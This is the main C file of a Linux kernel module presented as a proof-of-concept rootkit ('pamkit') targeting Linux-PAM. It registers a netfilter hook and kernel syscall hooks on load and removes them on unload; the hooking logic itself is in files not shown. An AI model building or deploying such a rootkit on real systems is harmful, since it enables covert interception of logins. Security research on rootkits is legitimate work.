#include <linux/init.h>
#include <linux/module.h>

#include "sys.h"
#include "net.h"
#include "hooking_framework.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("arm1nt");
MODULE_DESCRIPTION("PoC rootkit targeting Linux-PAM");

static int __init pamkit_init(void)
{
    pr_info("Initializing pamkit\n");

    int ret = 0;
    ret = add_netfilter_hook();

    if (ret) {
        pr_alert("Unable to register netfilter hook\n");
        return ret;
    }

    ret = do_syscall_hooking();

    if (ret) {
        pr_alert("Unable to hook kernel functions\n");
        return ret;
    }

    pr_info("Initialized pamkit\n");
    return ret;
}

static void __exit pamkit_exit(void)
{
    pr_info("Unloading pamkit\n");

    remove_netfilter_hook();
    undo_syscall_hooking();

    pr_info("Unloaded pamkit\n");
}

module_init(pamkit_init);
module_exit(pamkit_exit);
